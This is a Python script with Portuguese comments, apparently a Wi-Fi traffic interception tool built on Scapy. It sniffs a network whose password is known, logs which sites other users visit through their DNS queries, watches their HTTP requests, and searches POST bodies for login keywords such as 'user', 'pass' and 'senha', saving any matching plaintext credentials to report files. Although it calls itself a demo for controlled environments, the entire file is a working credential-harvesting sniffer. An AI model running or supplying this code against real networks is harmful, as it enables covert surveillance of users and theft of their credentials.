#!/usr/bin/env python3
"""
MÓDULO DE INTERCEPTAÇÃO E ANÁLISE DE TRÁFEGO WI-FI (SNIFFING)
------------------------------------------------------------
Este módulo permite a captura e descriptografia de tráfego 802.11 em tempo real,
focando na extração de dados de usuários (DNS, HTTP, Credenciais) em redes
onde a senha é conhecida.

Ideal para demonstrações de segurança em ambientes controlados.
"""

import logging
import os
import sys
from typing import Any, Optional
from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt, IP, TCP, UDP, DNS, DNSQR, Raw, conf
from datetime import datetime

# Configuração de Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler("logs/wifi_traffic_intercept.log"), logging.StreamHandler()]
)
logger = logging.getLogger("TrafficSniffer")

class WiFiTrafficSniffer:
    """Motor de interceptação de tráfego Wi-Fi"""

    def __init__(self, interface: str, ssid: Optional[str] = None, password: Optional[str] = None):
        self.interface = interface
        self.ssid = ssid
        self.password = password
        self.target_bssid = None
        
        # Configurar Scapy para descriptografia se a senha for fornecida
        if self.password and self.ssid:
            try:
                # Nota: A descriptografia em tempo real no Scapy requer que o handshake seja capturado durante a sessão
                conf.wepkey = self.password
                logger.info(f"Configurada senha para descriptografia da rede: {self.ssid}")
            except Exception as e:
                logger.error(f"Erro ao configurar descriptografia: {e}")

    def process_packet(self, packet: Any):
        """Analisa pacotes capturados em busca de informações sensíveis"""
        
        # 1. Identificação da Rede Alvo (se não definida)
        if not self.target_bssid and self.ssid and packet.haslayer(Dot11Beacon):
            ssid_detected = packet[Dot11Elt].info.decode(errors='ignore')
            if ssid_detected == self.ssid:
                self.target_bssid = packet[Dot11].addr2
                logger.info(f"Rede Alvo Identificada: {self.ssid} [{self.target_bssid}]")

        # 2. Análise de Camada de Rede (IP)
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            # 3. Interceptação de Consultas DNS (Sites visitados)
            if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
                query = packet.getlayer(DNSQR).qname.decode(errors='ignore')
                logger.info(f"[DNS] Usuário {src_ip} acessando: {query}")

            # 4. Interceptação de Tráfego HTTP (Dados em texto plano)
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load.decode(errors='ignore')
                
                # Detectar requisições HTTP
                if "GET " in payload or "POST " in payload:
                    host = "Unknown"
                    for line in payload.splitlines():
                        if "Host:" in line:
                            host = line.split("Host: ")[1]
                    logger.info(f"[HTTP] Usuário {src_ip} -> {host}")
                    
                    # 5. Busca por Credenciais em texto plano (POST)
                    if "POST " in payload:
                        keywords = ["user", "pass", "login", "email", "senha"]
                        if any(key in payload.lower() for key in keywords):
                            logger.warning(f"[ALERTA] Possíveis credenciais detectadas de {src_ip}!")
                            # Salvar payload para análise posterior (forense)
                            self._save_intercepted_data(src_ip, payload)

    def _save_intercepted_data(self, source: str, data: str):
        """Salva dados sensíveis interceptados para o relatório final"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"resources/reports/intercepted_{source}_{timestamp}.txt"
        os.makedirs("resources/reports", exist_ok=True)
        with open(filename, "w") as f:
            f.write(data)
        logger.info(f"Dados sensíveis salvos em: {filename}")

    def start_sniffing(self, filter_str: str = ""):
        """Inicia a captura de tráfego"""
        logger.info(f"Iniciando Sniffing na interface {self.interface}...")
        try:
            # O filtro pode ser usado para focar em IPs específicos ou protocolos
            sniff(iface=self.interface, prn=self.process_packet, filter=filter_str, store=0)
        except KeyboardInterrupt:
            logger.info("Sniffing interrompido pelo usuário.")
        except Exception as e:
            logger.error(f"Erro durante o sniffing: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 wifi_traffic_sniffer.py <interface> [ssid] [password]")
        sys.exit(1)

    iface = sys.argv[1]
    ssid = sys.argv[2] if len(sys.argv) > 2 else None
    pwd = sys.argv[3] if len(sys.argv) > 3 else None

    sniffer = WiFiTrafficSniffer(iface, ssid, pwd)
    sniffer.start_sniffing()
